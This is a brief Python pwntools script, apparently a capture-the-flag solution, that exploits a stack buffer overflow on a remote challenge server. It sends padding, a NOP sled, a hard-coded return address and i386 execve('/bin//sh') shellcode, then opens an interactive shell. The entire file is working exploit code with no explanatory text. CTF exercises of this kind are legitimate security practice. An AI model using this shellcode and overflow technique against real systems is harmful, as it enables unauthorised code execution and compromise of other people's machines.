from pwn import *

context.update(arch='i386', os='linux')

p = remote('challenge.acictf.com', 31813)
SHELLCODE = "\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
PADDING = '\x90' * 315
p.sendline('HELLOaaaa\x00\x00\x00\x00\x04' + PADDING +  '\x08\x04\x86\x67'[::-1] + '\x90' * 51 + SHELLCODE + '\x00')
print p.interactive()